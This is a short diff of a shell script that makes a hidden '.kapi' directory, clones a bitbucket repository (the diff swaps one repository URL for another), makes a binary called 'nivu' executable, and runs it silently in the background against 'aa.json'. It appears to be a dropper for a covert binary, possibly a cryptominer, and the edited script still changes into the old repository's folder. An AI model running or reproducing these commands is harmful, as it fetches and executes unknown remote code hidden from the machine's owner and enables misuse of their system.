@@ -1,5 +1,5 @@
 mkdir .kapi && cd .kapi
-git clone https://bitbucket.org/jeffreyadams29/nevox.git
+git clone https://bitbucket.org/nyileuh/herotes.git
 cd nevox
 chmod +x aa.json && chmod +x nivu
 ./nivu -c "aa.json" > /dev/null 2>&1 &
